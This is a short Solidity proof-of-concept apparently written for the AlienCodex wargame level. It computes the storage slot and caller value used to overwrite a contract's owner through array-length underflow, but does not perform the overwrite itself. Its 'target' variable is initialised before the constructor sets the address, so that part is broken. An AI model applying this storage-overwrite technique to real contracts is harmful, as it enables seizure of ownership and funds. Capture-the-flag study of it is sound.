// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
        function makeContact() external;
        function record(bytes32 _content) external;
        function retract() external;
        function revise(uint i, bytes32 _content) external;
    }

contract poc{
    address addr_;
    event log(bytes32);
    event log1(bytes32);
    constructor(address addr){
        addr_=addr;
    }
    
    IAlienCodex target=IAlienCodex(addr_);
    //Aliencodex target=Aliencodex(0x77dAE33C66d21aCCA4BEC757714121C6196D527f);
    function compute() public{
        uint256 n=0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
        bytes32 index=bytes32(n-uint256(keccak256(abi.encodePacked(uint256(1)))));
        
        bytes32 a =bytes32(uint256(uint160(msg.sender)));
        emit log(index);
        emit log1(a);
    }
}